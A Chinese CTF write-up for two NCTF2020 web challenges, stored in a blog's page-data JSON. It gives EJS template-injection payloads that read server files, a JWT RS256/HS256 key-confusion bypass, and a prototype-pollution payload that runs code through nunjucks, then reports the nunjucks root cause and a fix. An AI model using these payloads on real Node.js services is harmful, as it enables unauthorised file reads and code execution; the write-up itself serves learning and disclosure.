{"componentChunkName":"component---src-pages-detail-tsx","path":"/detail/2974689e-8bec-5932-99d3-3e99d7de4e5f","result":{"pageContext":{"html":"<h1>前言</h1>\n<p>从大一开始我每年都打 NCTF，<del>除了恰烂钱，</del>感觉每次都可以学到点不一样的东西。今年的 web 题有点不一样，感觉挺有意思的，加深了我对 JavaScript 相关的一些安全问题的理解。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/40a97/profile.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.24324324324324%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQoz2NQy8tUzc8ST08USIzmT4gSTIwGoaQYCBcFxUcKpcQpZCUp5qbJ5qQqleYznPn49vTHtyc/vt3z5MG6a5eA5N6nD4HkgRdPTnx4g4aOv3997P3ro0Dy3atjb18y/IeB399//Pn6DcT6+w+E/v0nCBiAaiDKfvz8+fPXr38gvSDw9y+I/vL166/fv//8/QtHEPUQhLD5FxhA2GDtIDN///4NNAWnzXAW0OJPnz79+fMHqA1oCpD7/ft3oE4g4+vXrz9+/PgLBtg1A5V++PABohnsg1+fP38GcoGWv3v3DsiG+AW7ZjSD4d6GM/A5mwwAAGEm5FE6BxmUAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"profile\"\n        title=\"profile\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/fcda8/profile.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/12f09/profile.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/e4a3f/profile.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/fcda8/profile.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/efc66/profile.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/c83ae/profile.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/b7aeefecca63105e3ab88a5801086b47/40a97/profile.png 1911w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<h2>JS-world</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/476e1/problem1-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.08108108108109%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXElEQVQozz2Qe0/aUBjG+1mEdr1BR+mNVmonXtBJ1LjNuDh1whhXI0T0j6lbsohRYiuy4AUvm6LiNiUB2kK7fbcddduTJydPTs4vz/se6KhyfFQ5qZx83VF3i3tq9fq0uKdpu6WDw+P9w0p+c4vjfTTNulwUw3CCz88wrMBwfsmnyBxktjsfcpn15axl/2oZZmlHbepmQ2+o6trtxdnNzzultw8ANO2l3JSXYQmScDidPOd51sNCt41majQ0pXTXW/rV5dW70UChoN7Vf0Tmx+ezubPz6vBQUBAkr5fxMDzL+xiPl8QxMAvPy1BTN06L5aNSuWWatVpNU7XazXfdMA/K5cOT0/OLqiTJ4Cko53wy7+/heZ7ACUmgRwYkyDAM07batq0bBnC7Y7X0+6Cb4M6+vLp2uz0IgjFeFizc2yPLIsdQrgGFnZnshTYLxfyWtrGt5UEoFDe2dzf/Bm1bLa192gAwihKsqPSHAsFQX2i0Lzjs5wWWohjoxXR0ai4xEwaOz4bjj+dcJDEXSU6H0xOv50mSAjDYWRS7A3L3gCzKkkgQhMPRBY1MhsenY/HVUvLjQWJ9P/O5ksmf5bYuEmtfJt7ER17OEiSF4y4MI5yOe3U5wGc7URRFEASilTFaGYf7E12Di3BwEXueQYYy8FAWDybFwVdCYAwn3ABGUQxBYOSfAAzDMBROrUTSK9F0Lppeer+Qi6aWYuml2EIutrCcyK6+jWfIh2YAg0L4Qf8DpBudRstsGlbLtPW23bHu3bZss2PVjd/fqjdPKRpFSYJw4Tj+5EEYhj02/wFVCvqc41mDwAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem1-1.png\"\n        title=\"problem1-1.png\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/fcda8/problem1-1.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/12f09/problem1-1.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/e4a3f/problem1-1.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/fcda8/problem1-1.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/efc66/problem1-1.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/c83ae/problem1-1.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/710201356273b643ef19d30d233b05b5/476e1/problem1-1.png 1841w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>这道题涉及到的是 ejs 模板的注入问题，同时传入的后端的信息会先经过前端过滤一次。可以通过 DevTool 的断点调试功能，找到相关的过滤关键字的代码如下，删除后即可绕过。</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-javascript line-numbers\"><code class=\"language-javascript\">_0x23132f <span class=\"token operator\">=</span> _0x23132f<span class=\"token punctuation\">[</span><span class=\"token function\">_0x1bef85</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>\n  <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">[\\/\\*\\'\\\"\\`\\&lt;\\\\\\>\\-\\(\\)\\[\\]\\=\\%\\.]</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"\"</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这里的输入存在模板注入问题，通过 payload <code>> &#x3C;%= global.process.mainModule.constructor._load(\"fs\"). readdirSync(\"/\") %> &#x3C;</code> 和<code>> &#x3C;%= global.process.mainModule.constructor._load(\"fs\"). readFileSync(\"/flag.txt\") %> &#x3C;</code> 即可读取目录并获得 flag</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/864a6/problem1-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.35135135135135%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB0ElEQVQoz5VTW07bQBSdHaUJTUlEHSSQStUNoCyhv6yDdfSjUsUGKuWjQgQmEzvFdaN8kOantoODmdiescd2womdUlpIH0ejq+vxPfeeeyyT40OtfaA9b77UNK3RaFZrtUqliqTV2t3ZwWVru9GsPKtu1WrtvXq9/mKrvr27//q4/eroTYt8+8wso6czqvepwc5Z74LRLg5uevSc0os+4tknnfXMPu10OrR7ag2oOxx8PHlPhFKhEHmWLf8NXrwcegtUDy5NEgaBf3Mzm82m06ntOo7rIPd9/xbgHAnncwCBcy6j+TsWvf0wt2ehQbsENY7jyDhOpBD+tYpFmqa4LFsEQZD9isUiy3MFCZeGTjzPm0wmMchJrJI1whCCAkTkcQEp5TqJkzCSIBuGsSKPx+OVJClLplKqkMyRJA9w/4hKkBljBMt9t+1Czwp5niNiLMiYHEVRGcFETV4Ae60niyAQUYRmAjsLkRW2g//QYRDwViqpUpXgJHK5SL8MdBLyW9e2rz0PbruuC8FohDl/+FrohWhZFoEtX4dDZKPRyDTNqwIw4vH8J8hYAFLTH9hE2Ej+7d1f+T/J2SPyf0wu7SmVb5qZKrUSiB8gVfd2wqA7aowtdpm3FkwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem1-1.png\"\n        title=\"problem1-1.png\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/fcda8/problem1-2.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/12f09/problem1-2.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/e4a3f/problem1-2.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/fcda8/problem1-2.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/efc66/problem1-2.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/c83ae/problem1-2.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/77e21de23941247167442bb0c0ead368/864a6/problem1-2.png 2276w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<h2>PackageManager_v1.0</h2>\n<p>这道题可以获取到源码，通过审计代码发现了一个问题，这里的鉴权使用的是 JWT token，签名时使用的是 RS256，但是验证时使用的是 RS256 和 HS256，同时将公钥加到了 payload 中。RS256 是非对称加密算法，HS256 是对称加密算法。因此我们可以解析 token 后获取到公钥，并使用公钥和 HS256 生成自己的 token，绕过鉴权。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/35751/problem2-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.027027027027025%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAp0lEQVQY032PAQ7CMAhFvcu6bqwMaGHd1qnT+1/KapYYo/GFhITkAf/U9z0wy7TQskhi6LxzrWvci6O5pnkOXet9rTcnAPBdRwPuZdu2Mq9Fy3Ter5PldS23232ZV01GhExQD33LnmBQIo1SREiYItdv4otxHFVNeBQe4JfcMYTMMmu6xMQpYkQzizHlnBExT9ksM6NpqCtMMYRwyJVnmkoN1n6k+s8D6wUzPRSWUo0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-1\"\n        title=\"problem2-1\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/fcda8/problem2-1.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/12f09/problem2-1.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/e4a3f/problem2-1.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/fcda8/problem2-1.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/f514f7b1b35eab858bd9b180887bccee/35751/problem2-1.png 873w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>代码中存在着对象 clone 的代码，有原型链污染的漏洞</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/84ee5/problem2-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.75675675675676%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABPElEQVQoz42SS3LDIBBEfZNEliyJAQYQw0foW2Unuf+NMo6dVBap2M2KRTOvezhIUW8zIkohQAJLSgmoAER/eqRD9VoZ72jeU5zjVsrkPy4xBWNQtm3X/is2v4BGl2dP2VMgjxStkr21ousemY/Ho5SK0AzWaqu9U97Jvu/bJ3So61or7Tw5b3PCGBwhDho0h35mshDCGLtv+1qWbT2PyUkpnprMZm5W9GJd1qWUPIZ1nzyDuEEpZP7uL30XVlWc2Sv0yIkNEaaARBRDymkcc+GHcsrkKcU88smjs4x21dWslHIhxJKX0Q+D4rQG4HRqm6Zhrvqmpv595SXfsZktUng/v5VlitNQpmFbVt74PC88Fr9keRda89Vax5NBwA82FwTQC1BSKQmi5aDcAn83hgK4/zvulf034NsuPwEkgXBL+ONhaAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-2\"\n        title=\"problem2-2\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/fcda8/problem2-2.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/12f09/problem2-2.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/e4a3f/problem2-2.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/fcda8/problem2-2.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/efc66/problem2-2.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/3cd8a1c57a0e9d25dfa59af03b2d52be/84ee5/problem2-2.png 1076w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/1fbe8/problem2-3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.21621621621621%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWElEQVQoz5VS2VLDMBDrp5DSxMcePmI7TcLQk/L/f8Q6QKfQB4riGXvHlqWVs2J43s2BmbyHyzGknp0HRNJad39h1ayfczT9OPr9vj8dt9OIBMJWWm9aQT3Udu2ybL+nK/npqVNaamAoKUyOC3Jw3htMAWKwpE221PsQ0QW2OQGh+aSv1uu1MVopRZ5ddIEok0Niow2SAdCyh9qClWU9iCiT6m7IRsiWYH47Hc+HYTfFeS5jX0pRXTW/qUarmOrUT9tN80mWLbLgmNN2yK95eEm7191YhjHmXAoP3qe4LVsmugmsaay1aoFcKj1OfZEWXY59Sk6ad56ZF121aNykLbavZLGHFi7n92ma9sfDNM7BQDAo0gDQXu12d7YlIUY035BaLgVjrJHYJDet7iDvXMkIGHwcXS+egw9okeS7Amp5P6ptqAIVS57/wFdg9Te6a+kh8q8MH8cHLC2A0JZ2U9MAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-3\"\n        title=\"problem2-3\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/fcda8/problem2-3.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/12f09/problem2-3.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/e4a3f/problem2-3.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/fcda8/problem2-3.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/7881e65a8432c0f093837ebc85d18910/1fbe8/problem2-3.png 757w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>这里当第 9 行的 key 为<code>__proto__</code>时就会造成原型链污染，修改变量<code>a</code>的原型(即 Object.prototype)上的属性。</p>\n<p>同时，这里使用的模板引擎是 nunjucks，其源代码中存在着一些<code>new Function</code>和字符串拼接，有被注入的可能性。</p>\n<p>构造 payload 如下，即可成功获取 flag</p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-json line-numbers\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"author\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"111\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"__proto__\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"global.process.mainModule.require('fs').readFileSync('/w0w_Congrats_Th1s_1s_y0ur_flaaag')\"</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 590px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/3d68f/problem2-5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 76.35135135135135%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB9ElEQVQoz51SyW4UQQztXyQLySwhg0g4kAPcEBcu/AZXznDhD+aAxCzdMxMWwQEhFGbp6eqlFrvK1Y2rR6AgBQl4emXJVbZlP1f04lH32cXd45PB4PS01z85PLy9t7ff6XTvnZ13ur1er9/v37m1f9A5PnpyPzgHR53B+YNXTy+ePzyLvn5YvJ/Hi3h0GY/eJeNZPJ4nk1nMHCXJNI6nSTKZTqeLWbKIJ8PhcPL2zafL+Mt8/HEyipCoKEuH2DRNzfC++QPqOtgr2Yyv6sJQJVUEYLaMLFu3WK6Wq/VaCJFlWZ4XIhd5wcUD8qJEVb5M5OPX8vO3rRRpREQAoLRmq43RstQiBaPBBFjQtacb2nCAVRFxp4DWVpWqpAvRaJAAyaBjWseWWjqwxNRI6MJoSqmQbIBfwAI4MBYtWM9Bu2jrvLHulwttXaJryc1/gdsNM1vL3TF21nG1VvXa1y197RxhCGpJIbIJ46kItUxXyyKIGdQty0Ir6RB+W5KvyYdqTGJ6clrKsoj4ttQGC1F9zzYbW2S4SW2+zRAB+UCw18Ed7P4CP4TkyqAWAlJRlXUlG2s9r0y1kFJWLXjPbNnlS56Uk22Y2XvF5XjVQvC81v6tYD+TedFaeaJ/UjskOwq/FLUOkvibF0cteFRWmr8dy82u1uYHh9A/Wmd6UVQAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"problem2-5\"\n        title=\"problem2-5\"\n        src=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/fcda8/problem2-5.png\"\n        srcset=\"https://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/12f09/problem2-5.png 148w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/e4a3f/problem2-5.png 295w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/fcda8/problem2-5.png 590w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/efc66/problem2-5.png 885w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/c83ae/problem2-5.png 1180w,\nhttps://cdn.jsdelivr.net/gh/ChenKS12138/ChenKS12138.github.io/static/08460c318131ffe54333d7f2d37377a4/3d68f/problem2-5.png 2282w\"\n        sizes=\"(max-width: 590px) 100vw, 590px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>-------------------------时间分割线---------------------------</p>\n<p>2020 年 11 月 25 日</p>\n<p><img src=\"https://user-images.githubusercontent.com/42082890/100094205-9cc29480-2e93-11eb-8365-6b2d191de84e.png\" alt=\"payload\"></p>\n<p>后面排查发现这个是<code>nunjucks</code>的一个漏洞，目前已经发起 Pull Request 修复了<a href=\"https://github.com/mozilla/nunjucks/pull/1330/\">nunjucks/pull/1330/</a>。感谢出题人<a href=\"https://bycsec.top\">@baiyecha404</a>的题发现了这个漏洞。</p>\n<p>经过排查，问题出在<a href=\"https://github.com/mozilla/nunjucks/blob/f51afa3382eab27ccb216c0f302832e5a4135ac5/nunjucks/src/runtime.js\">nunjucks/src/runtime.js</a>文件中<code>Frame.prototype.variables</code>变量中，错误地使用普通的 object 作为 Map 使用，导致读取变量时可能会从 Object.prototype 中读取变量。当 npm 包外发生 Object.prototype 被污染时，会导致读取 variables 上的属性时得到意料之外的值，同时模板引擎存在着大量字符串拼接，这导致 payload 被执行。</p>\n<p>使用<code>Object.create(null)</code>替代<code>{}</code>作为 Map 会更为安全，同时也可以对原型使用<code>Object.freeze</code>避免原型被意外修改。</p>","id":"2974689e-8bec-5932-99d3-3e99d7de4e5f","headings":[{"value":"前言","depth":1},{"value":"JS-world","depth":2},{"value":"PackageManager_v1.0","depth":2}],"date":"Monday, November 23, 2020 6:36 PM","tags":["随笔","安全"],"title":"NCTF2020复盘"}},"staticQueryHashes":["63159454"]}